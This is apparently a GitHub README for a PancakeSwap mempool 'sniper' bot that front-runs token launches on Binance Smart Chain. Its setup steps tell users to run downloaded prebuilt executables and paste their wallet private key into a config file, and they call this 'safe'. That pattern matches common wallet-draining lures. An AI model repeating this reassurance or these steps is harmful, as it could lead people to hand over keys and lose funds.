
# PancakeSwap and BSC txpool/mempool sniper bot

## Purpose
This bot is a fork of an existing bot that I was trying to help my group with. After spending hours providing technical support to help them run it, I decided to fork it and update it to make it easier to use. No dependencies, nothing to install. Just download the bot for your operating system, create the ".env" file, and pass in the token you want to snipe in the command line.  I have tried my best to make this as simple and easy to do so that anyone can use it without being a computer expert.

What does this bot do? It allows you to compete with other trading bots when buying a token on PancakeSwap. Its faster than traditional bots because it watches the txpool/mempool where transactions are still "pending" on the BSC network. It will watch for when liquidity is added as a pending transaction and immediately submit your order, so that hopefully you get in right after liquidity is added and before everyone else. 

It can be used for fair launch projects, if you've missed the whitelist, or the private or public sales and you still want to buy immediately on PancakeSwap pair creation or when liquidity is added. We all know its impossible to compete with bots when buying manually. This bot evens the odds to play with the big boys.

## Features
* Operating with PancakeSwap: Router v2
* Specify options like gas price, gas limit, BSC node, etc
* Free

## Requirements
NOTHING. No need to install nodejs, modules, edit json or javascript files. HOWEVER, if you want to go the manual route, the source code is in this repository. Knock yourself out, but you are on your own. Don't ask me for help. The whole reason I did this was to avoid being someone else's tech support.

## Installation

 - [Download the release for your operating system (Windows, macOS, or
   Linux).](https://github.com/GiulianoEsposito/pancakeswap-txpool-sniper/releases/tag/release)
    - Also download the "[default.env](https://github.com/GiulianoEsposito/pancakeswap-txpool-sniper/releases/download/release/default.env)" file from the same page. 
    - THE SNIPER BOT AND THE ".ENV" FILE MUST BE IN THE SAME DIRECTORY
- On macOS and linux, you may have to make the bot executable `chmod +x txPoolSniper-linux` or `chmod +x txPoolSniper-macos`
- RENAME the "default.env" file to ".env"
- Open the ".env" file with a text editor 
	- For RECIPIENT, paste your BSC address after the equals (=) sign. 
	- For PRIVATE_KEY, paste your wallets private key after the equals (=) sign. 
		- THIS IS SAFE. It is needed in order to snipe, obviously.

	- OPTIONALLY you can specify a different BSC node to use to snipe with using the BSC_NODE_WSS variable. 
		- This can be any public or private node that supports websockets. The default server is "wss://bsc-ws-node.nariox.org:443".
	- OPTIONALLY you can also specify the PURCHASEAMOUNT (in BNB), the GASLIMIT, and the GASPRICE. The default values are already in the ".env" file.
- Once you are done editing the ".env" file, SAVE IT. You are now ready to snipe.

## Usage
Open the command prompt or terminal (depending on your OS) and change to the directory where you saved the bot and the ".env" file. 

#### Required parameters:
* `-t` or `--token` - this is the contract address of the token you're wanting to snipe starting with `0x`.

#### Sample command:
* `txPoolSniper-win.exe -t 0x580de58c1bd593a43dadcf0a739d504621817c05`
* `./txPoolSniper-linux -t 0x580de58c1bd593a43dadcf0a739d504621817c05`
* `./txPoolSniper-macos -t 0x580de58c1bd593a43dadcf0a739d504621817c05`

If you wish to use the bot at same time for multiple snipes, simply open another command prompt or terminal. You can run as many as you wish.
